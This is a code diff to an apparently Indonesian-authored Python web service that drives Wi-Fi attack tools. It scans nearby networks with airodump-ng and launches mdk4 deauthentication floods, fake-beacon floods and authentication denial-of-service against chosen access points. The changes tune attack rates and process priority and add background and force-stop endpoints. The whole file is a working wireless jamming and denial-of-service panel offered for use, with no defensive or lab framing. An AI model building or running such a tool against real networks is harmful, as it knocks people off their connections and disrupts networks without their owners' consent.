@@ -105,7 +105,6 @@ def get_monitor_interface():
             state.monitor_iface = iface
             return iface
     
-    # Try create monitor
     for iface in interfaces:
         if not iface.startswith("mon"):
             try:
@@ -229,7 +228,7 @@ def monitor_loop():
     
     while state.monitor_running:
         try:
-            if not state.targets:
+            if not state.targets or not state.monitor_iface:
                 time.sleep(2)
                 continue
             
@@ -272,6 +271,7 @@ def find_ssid_file():
     return None
 
 def stop_attack_internal():
+    """Stop attack - dijalankan di background biar gak blocking"""
     logger.info("Stopping attack...")
     state.running = False
     
@@ -314,6 +314,13 @@ def stop_attack_internal():
     
     logger.info("Attack stopped")
 
+def stop_attack_async():
+    """Stop attack di background thread - GA NYEBABIN TIMEOUT"""
+    thread = threading.Thread(target=stop_attack_internal)
+    thread.daemon = True
+    thread.start()
+    return thread
+
 # ====================== API ROUTES ======================
 
 @app.get("/")
@@ -343,18 +350,15 @@ async def scan_networks(duration: int = 10):
         interface = get_monitor_interface()
         logger.info(f"Scanning with {interface}")
         
-        # Clean old files
         for f in glob.glob("/tmp/scan_output*.csv"):
             try:
                 os.remove(f)
             except:
                 pass
         
-        # Run scan
         cmd = f"timeout {duration+2} sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
         subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=duration+5)
         
-        # Parse results
         networks = []
         for f in ["/tmp/scan_output-01.csv", "/tmp/scan_output.csv"]:
             if os.path.exists(f):
@@ -387,7 +391,7 @@ async def start_attack(req: AttackRequest):
         if not req.type:
             raise HTTPException(status_code=400, detail="No attack type selected")
         
-        # Build command
+        # 🔥 POWER AMAN + NICE PRIORITY
         cmd = None
         if req.type == "deauth":
             if req.targets:
@@ -396,36 +400,34 @@ async def start_attack(req: AttackRequest):
                     target_file.write(f"{target.bssid},{target.channel}\n")
                 target_file.close()
                 state.temp_files.append(target_file.name)
-                cmd = ["sudo", "mdk4", req.interface, "d", "-B", target_file.name, "-c", "h", "-s", "500"]
+                cmd = ["sudo", "nice", "-n", "19", "mdk4", req.interface, "d", "-B", target_file.name, "-c", "h", "-s", "200"]
                 state.targets = [t.dict() for t in req.targets]
             else:
-                cmd = ["sudo", "mdk4", req.interface, "d", "-c", "h", "-s", "500"]
+                cmd = ["sudo", "nice", "-n", "19", "mdk4", req.interface, "d", "-c", "h", "-s", "200"]
                 state.targets = []
                 
         elif req.type == "beacon":
             ssid_file = find_ssid_file()
             if not ssid_file:
                 raise HTTPException(status_code=400, detail="ssid_list.txt not found in ssid-fake folder")
-            cmd = ["sudo", "mdk4", req.interface, "b", "-f", ssid_file, "-w", "a", "-m", "-s", "500"]
+            cmd = ["sudo", "nice", "-n", "19", "mdk4", req.interface, "b", "-f", ssid_file, "-w", "a", "-m", "-s", "200"]
             state.targets = []
             
         elif req.type == "authdos":
             if not req.targets:
                 raise HTTPException(status_code=400, detail="Auth DOS needs 1 target")
             target = req.targets[0]
-            cmd = ["sudo", "mdk4", req.interface, "a", "-a", target.bssid, "-s", "1000"]
+            cmd = ["sudo", "nice", "-n", "19", "mdk4", req.interface, "a", "-a", target.bssid, "-s", "500"]
             state.targets = [target.dict()]
         
         if not cmd:
             raise HTTPException(status_code=400, detail="Invalid attack type")
         
-        # Start process
         logger.info(f"Starting: {' '.join(cmd)}")
         state.process = subprocess.Popen(cmd, preexec_fn=os.setsid)
         state.running = True
         state.type = req.type
         
-        # Start monitor
         if state.targets:
             if state.monitor_thread is None or not state.monitor_thread.is_alive():
                 state.monitor_thread = threading.Thread(target=monitor_loop)
@@ -451,11 +453,52 @@ async def start_attack(req: AttackRequest):
 @app.post("/api/attack/stop")
 async def stop_attack():
     try:
-        stop_attack_internal()
-        return {"status": "success", "message": "Attack stopped"}
+        # 🔥 FIX: Stop di background, langsung balas response
+        if state.running:
+            stop_attack_async()
+            return {"status": "success", "message": "Attack stopping..."}
+        else:
+            return {"status": "success", "message": "No attack running"}
     except Exception as e:
         logger.error(f"Stop error: {e}")
         traceback.print_exc()
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "message": str(e)}
+        )
+
+@app.post("/api/attack/force_stop")
+async def force_stop():
+    """Force stop - langsung kill semua proses"""
+    try:
+        logger.info("Force stopping all processes...")
+        
+        # Kill semua MDK4
+        subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
+        subprocess.run("sudo pkill -9 -f aireplay-ng", shell=True, check=False)
+        subprocess.run("sudo pkill -9 -f airodump-ng", shell=True, check=False)
+        
+        state.running = False
+        if state.process:
+            try:
+                state.process.kill()
+            except:
+                pass
+            state.process = None
+        
+        state.monitor_running = False
+        if state.monitor_thread and state.monitor_thread.is_alive():
+            try:
+                state.monitor_thread.join(timeout=2)
+            except:
+                pass
+            state.monitor_thread = None
+        
+        state.monitor_data = MonitorData()
+        state.targets = []
+        
+        return {"status": "success", "message": "Force stopped"}
+    except Exception as e:
         return JSONResponse(
             status_code=500,
             content={"status": "error", "message": str(e)}
@@ -481,11 +524,9 @@ async def get_monitor():
 def cleanup():
     logger.info("Cleaning up...")
     
-    # Stop attack
     state.running = False
-    
-    # Stop monitor thread
     state.monitor_running = False
+    
     if state.monitor_thread and state.monitor_thread.is_alive():
         try:
             state.monitor_thread.join(timeout=2)
@@ -493,7 +534,6 @@ def cleanup():
             pass
         state.monitor_thread = None
     
-    # Kill MDK4 process
     if state.process:
         try:
             if state.process.poll() is None:
@@ -503,13 +543,11 @@ def cleanup():
             pass
         state.process = None
     
-    # Pkill all mdk4
     try:
-        subprocess.run("sudo pkill -f mdk4", shell=True, check=False, timeout=3)
-    except:
         subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
+    except:
+        pass
     
-    # Clean temp files
     for f in state.temp_files:
         try:
             os.remove(f)
@@ -517,11 +555,9 @@ def cleanup():
             pass
     state.temp_files = []
     
-    # Reset data
     state.monitor_data = MonitorData()
     state.targets = []
     
-    # Cleanup monitor interface
     if state.monitor_iface:
         try:
             subprocess.run(["sudo", "airmon-ng", "stop", state.monitor_iface], check=False, timeout=3)
